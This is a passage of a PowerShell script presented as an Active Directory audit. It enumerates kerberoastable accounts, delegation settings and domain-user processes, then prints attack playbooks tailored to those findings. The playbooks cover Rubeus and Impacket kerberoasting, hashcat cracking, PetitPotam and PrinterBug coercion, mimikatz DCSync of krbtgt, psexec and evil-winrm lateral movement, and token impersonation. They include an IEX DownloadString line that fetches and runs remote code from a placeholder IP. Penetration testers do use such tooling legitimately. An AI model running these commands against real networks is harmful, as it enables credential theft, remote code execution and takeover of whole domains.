                Write-Host "    Rubeus.exe kerberoast /nowrap /outfile:kerberoast_hashes.txt" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe kerberoast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe kerberoast /format:john /nowrap" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Target specific users:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 3) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    Rubeus.exe kerberoast /user:$sam /nowrap" -ForegroundColor Yellow
                }
                
                Write-Host ""
                Write-Host "    # Using TGT delegation trick (opsec):" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe kerberoast /tgtdeleg /nowrap" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [ATTACK METHOD 2] Using Impacket (Linux):" -ForegroundColor White
                Write-Host "    # With credentials:" -ForegroundColor Cyan
                Write-Host "    impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request -outputfile hashes.txt" -ForegroundColor Yellow
                Write-Host "    impacket-GetUserSPNs $domain/[user] -hashes :[NTLM] -dc-ip [DC_IP] -request" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Target specific user:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request-user $sam" -ForegroundColor Yellow
                }
                
                Write-Host ""
                Write-Host "  [CRACKING METHODOLOGY]:" -ForegroundColor White
                Write-Host "    # Hashcat - Dictionary Attack:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt --force" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Hashcat - Dictionary + Rules:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule --force" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule --force" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Hashcat - Mask Attack:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 3 kerberoast_hashes.txt ?u?l?l?l?l?l?l?d?d" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 3 kerberoast_hashes.txt ?u?l?l?l?l?l?l?l?d?d" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # John the Ripper:" -ForegroundColor Cyan
                Write-Host "    john --wordlist=wordlist.txt kerberoast_hashes.txt" -ForegroundColor Yellow
                Write-Host "    john --wordlist=wordlist.txt --rules=Jumbo kerberoast_hashes.txt" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [POST-EXPLOITATION]:" -ForegroundColor White
                Write-Host "    # Validate cracked credentials:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    crackmapexec smb [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                    Write-Host "    crackmapexec winrm [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                }
                
                Write-Host ""
                Write-Host "    # Lateral movement with cracked creds:" -ForegroundColor Cyan
                Write-Host "    impacket-psexec $domain/[USER]:[PASS]@[TARGET]" -ForegroundColor Yellow
                Write-Host "    evil-winrm -i [TARGET] -u [USER] -p [PASS]" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No kerberoastable accounts found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating SPN users: $_" -ForegroundColor Red
        }
        
        # ===== UNCONSTRAINED DELEGATION =====
        Write-Host ""
        Write-Host "[+] Unconstrained Delegation:" -ForegroundColor Cyan
        Write-Host "  Description: Systems trusted for delegation to any service" -ForegroundColor Gray
        Write-Host "  Risk Level: CRITICAL - Can impersonate any user" -ForegroundColor Red
        
        try {
            # TRUSTED_FOR_DELEGATION
            $searcher = [adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','lastlogontimestamp'))
            
            $unconstrainedComputers = $searcher.FindAll()
            
            if ($unconstrainedComputers.Count -gt 0) {
                Write-Host ""
                Write-Host "  [!] UNCONSTRAINED DELEGATION FOUND: $($unconstrainedComputers.Count) systems" -ForegroundColor Red
                
                foreach ($comp in $unconstrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    
                    Write-Host ""
                    Write-Host "  [Computer: $hostname]" -ForegroundColor Red
                    
                    if ($comp.Properties['operatingsystem']) {
                        Write-Host "    OS: $($comp.Properties['operatingsystem'][0])" -ForegroundColor Gray
                    }
                    
                    if ($comp.Properties['lastlogontimestamp'] -and $comp.Properties['lastlogontimestamp'][0]) {
                        try {
                            $lastLogon = [datetime]::FromFileTime([int64]$comp.Properties['lastlogontimestamp'][0])
                            $daysSince = (New-TimeSpan -Start $lastLogon -End (Get-Date)).Days
                            Write-Host "    Last Active: $daysSince days ago" -ForegroundColor Yellow
                        } catch {}
                    }
                    
                    $script:Results.DelegationComputers += [PSCustomObject]@{
                        Hostname = $hostname
                        Type = 'Unconstrained'
                    }
                }
                
                Write-Host ""
                Write-Host "  [UNCONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                
                Write-Host ""
                Write-Host "  [Step 1] Compromise Unconstrained Delegation System" -ForegroundColor White
                
                $firstHost = $unconstrainedComputers[0].Properties['dnshostname'][0]
                Write-Host ""
                Write-Host "  [Step 2] Monitor for TGTs (on $firstHost):" -ForegroundColor White
                Write-Host "    # Using Rubeus:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe monitor /interval:5 /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [Step 3] Force Authentication from Target:" -ForegroundColor White
                Write-Host "    # Method 1: SpoolSample (PrinterBug):" -ForegroundColor Cyan
                Write-Host "    SpoolSample.exe [TARGET_DC] $firstHost" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Method 2: PetitPotam:" -ForegroundColor Cyan
                Write-Host "    PetitPotam.exe $firstHost [TARGET_DC]" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [Step 4] Extract and Use TGT:" -ForegroundColor White
                Write-Host "    Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
                Write-Host "    mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [Step 5] DCSync Attack:" -ForegroundColor White
                Write-Host "    mimikatz.exe `"lsadump::dcsync /domain:$domain /user:Administrator`" `"exit`"" -ForegroundColor Yellow
                Write-Host "    mimikatz.exe `"lsadump::dcsync /domain:$domain /user:krbtgt`" `"exit`"" -ForegroundColor Yellow
                Write-Host "    impacket-secretsdump -just-dc-user krbtgt $domain/[USER]@[DC_IP]" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No unconstrained delegation found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating unconstrained delegation: $_" -ForegroundColor Red
        }
        
        # ===== CONSTRAINED DELEGATION =====
        Write-Host ""
        Write-Host "[+] Constrained Delegation:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=computer)(msds-allowedtodelegateto=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','msds-allowedtodelegateto','useraccountcontrol'))
            
            $constrainedComputers = $searcher.FindAll()
            
            if ($constrainedComputers.Count -gt 0) {
                Write-Host "  [!] Constrained delegation found: $($constrainedComputers.Count) systems" -ForegroundColor Yellow
                
                foreach ($comp in $constrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    $allowedTo = $comp.Properties['msds-allowedtodelegateto']
                    
                    Write-Host ""
                    Write-Host "  [Computer: $hostname]" -ForegroundColor Yellow
                    Write-Host "    Allowed to Delegate To:" -ForegroundColor Gray
                    foreach ($target in $allowedTo) {
                        Write-Host "      - $target" -ForegroundColor Yellow
                    }
                }
                
                Write-Host ""
                Write-Host "  [CONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                $firstComp = ($constrainedComputers[0].Properties['dnshostname'][0] -split '\.')[0]
                $firstTarget = $constrainedComputers[0].Properties['msds-allowedtodelegateto'][0]
                Write-Host "    Rubeus.exe s4u /user:$firstComp`$ /rc4:[NTLM] /impersonateuser:Administrator /msdsspn:$firstTarget /ptt" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No constrained delegation found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating constrained delegation: $_" -ForegroundColor Red
        }
        
    } else {
        Write-Host ""
        Write-Host "[!] System not domain-joined - AD enumeration skipped" -ForegroundColor Yellow
    }
    
    # ========================================================================
    # SECTION 4: PROCESS TOKEN ANALYSIS
    # ========================================================================
    Write-Host ""
    Write-Host "================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 4] PROCESS & TOKEN ANALYSIS" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "[+] Processes Running as Domain Users:" -ForegroundColor Cyan
    
    $domainProcesses = Get-CimInstance Win32_Process | ForEach-Object {
        try {
            $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction Stop
            if ($owner.Domain -and 
                $owner.Domain -ne $env:COMPUTERNAME -and 
                $owner.User -notmatch '^(SYSTEM|DWM-|UMFD-)') {
                [PSCustomObject]@{
                    ProcessName = $_.Name
                    PID = $_.ProcessId
                    Domain = $owner.Domain
                    User = $owner.User
                    CommandLine = $_.CommandLine
                }
            }
        } catch {}
    }
    
    if ($domainProcesses) {
        $grouped = $domainProcesses | Group-Object Domain,User | Sort-Object Count -Descending
        
        Write-Host "  Found $($domainProcesses.Count) domain user processes across $($grouped.Count) accounts" -ForegroundColor Yellow
        
        foreach ($group in $grouped) {
            Write-Host ""
            Write-Host "  [Account: $($group.Name)]" -ForegroundColor Yellow
            Write-Host "    Process Count: $($group.Count)" -ForegroundColor Gray
            Write-Host "    Processes:" -ForegroundColor Gray
            
            $topProcs = $group.Group | Select-Object -First 5
            foreach ($proc in $topProcs) {
                Write-Host "      - $($proc.ProcessName) (PID: $($proc.PID))" -ForegroundColor White
            }
            
            if ($group.Count -gt 5) {
                Write-Host "      ... and $($group.Count - 5) more" -ForegroundColor Gray
            }
            
            $script:Results.Processes += $group.Group
        }
        
        Write-Host ""
        Write-Host "  [TOKEN MANIPULATION TECHNIQUES]:" -ForegroundColor Red
        
        Write-Host ""
        Write-Host "  [Method 1] Incognito Token Impersonation:" -ForegroundColor White
        Write-Host "    incognito.exe list_tokens -u" -ForegroundColor Yellow
        foreach ($group in $grouped | Select-Object -First 2) {
            Write-Host "    incognito.exe execute -c `"$($group.Name)`" cmd.exe" -ForegroundColor Yellow
        }
        
        Write-Host ""
        Write-Host "  [Method 2] Invoke-TokenManipulation:" -ForegroundColor White
        Write-Host "    IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
        Write-Host "    Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
        foreach ($group in $grouped | Select-Object -First 2) {
            Write-Host "    Invoke-TokenManipulation -ImpersonateUser -Username `"$($group.Name)`"" -ForegroundColor Yellow
        }
        
        Write-Host ""
        Write-Host "  [Method 3] Process Injection:" -ForegroundColor White
        $firstProc = $domainProcesses[0]
        Write-Host "    # Using Metasploit:" -ForegroundColor Cyan
        Write-Host "    migrate $($firstProc.PID)" -ForegroundColor Yellow
        
    } else {
        Write-Host "  No domain user processes found" -ForegroundColor Gray
    }
    
    # ========================================================================
    # FINAL REPORT
    # ========================================================================
    Write-Host ""
    Write-Host "================================================================================" -ForegroundColor Cyan
    Write-Host "AUDIT SUMMARY" -ForegroundColor Cyan
    Write-Host "================================================================================" -ForegroundColor Cyan
    
    $endTime = Get-Date
    $duration = $endTime - $script:StartTime
    
    Write-Host ""
    Write-Host "[+] Audit Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[+] Duration: $([math]::Round($duration.TotalSeconds,2)) seconds" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Results Summary:" -ForegroundColor Cyan
    Write-Host "  - Service Accounts: $($script:Results.ServiceAccounts.Count)" -ForegroundColor $(if($script:Results.ServiceAccounts.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - AS-REP Roastable: $($script:Results.ASREPUsers.Count)" -ForegroundColor $(if($script:Results.ASREPUsers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Kerberoastable: $($script:Results.KerberoastUsers.Count)" -ForegroundColor $(if($script:Results.KerberoastUsers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Delegation Systems: $($script:Results.DelegationComputers.Count)" -ForegroundColor $(if($script:Results.DelegationComputers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Domain Processes: $($script:Results.Processes.Count)" -ForegroundColor $(if($script:Results.Processes.Count -gt 0){'Yellow'}else{'Green'})
    Write-Host "  - Kerberos Tickets: $($script:Results.Tickets.Count)" -ForegroundColor Gray
    
    # Risk calculation
    $riskScore = ($script:Results.ServiceAccounts.Count * 5) + 
                 ($script:Results.ASREPUsers.Count * 10) + 
                 ($script:Results.KerberoastUsers.Count * 8) + 
                 ($script:Results.DelegationComputers.Count * 15) +
                 ($enabledPrivileges.Count * 10)
    
    Write-Host ""
    Write-Host "[+] Calculated Risk Score: $riskScore" -ForegroundColor $(
        if($riskScore -gt 50){'Red'}
        elseif($riskScore -gt 25){'Yellow'}
        else{'Green'}
    )
    
    if ($riskScore -gt 50) {
        Write-Host "[!] CRITICAL RISK - Immediate remediation required!" -ForegroundColor Red
    } elseif ($riskScore -gt 25) {
        Write-Host "[!] ELEVATED RISK - Review and remediate findings" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Acceptable risk level" -ForegroundColor Green
    }
    
    # Export results
    if ($ExportToCsv) {
        try {
            if ($script:Results.ServiceAccounts.Count -gt 0) {
                $script:Results.ServiceAccounts | Export-Csv -Path "$OutputDirectory\ServiceAccounts.csv" -NoTypeInformation
            }
            if ($script:Results.ASREPUsers.Count -gt 0) {
                $script:Results.ASREPUsers | Export-Csv -Path "$OutputDirectory\ASREPUsers.csv" -NoTypeInformation
            }
            if ($script:Results.KerberoastUsers.Count -gt 0) {
                $script:Results.KerberoastUsers | Export-Csv -Path "$OutputDirectory\KerberoastUsers.csv" -NoTypeInformation
            }
            if ($script:Results.DelegationComputers.Count -gt 0) {
                $script:Results.DelegationComputers | Export-Csv -Path "$OutputDirectory\DelegationComputers.csv" -NoTypeInformation
            }
            Write-Host ""
            Write-Host "[+] Results exported to: $OutputDirectory" -ForegroundColor Green
        } catch {
            Write-Host ""
            Write-Host "[!] Export failed: $_" -ForegroundColor Red
        }
    }
    
    Write-Host ""
}

# ============================================================================
# EXECUTION
# ============================================================================

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "[!] WARNING: Not running with administrative privileges" -ForegroundColor Yellow
    Write-Host "[!] Many enumeration capabilities will be limited" -ForegroundColor Yellow
    Write-Host ""
}

# Execute with default parameters
Invoke-NativeADExploitAudit -FullEnumeration -ExportToCsv
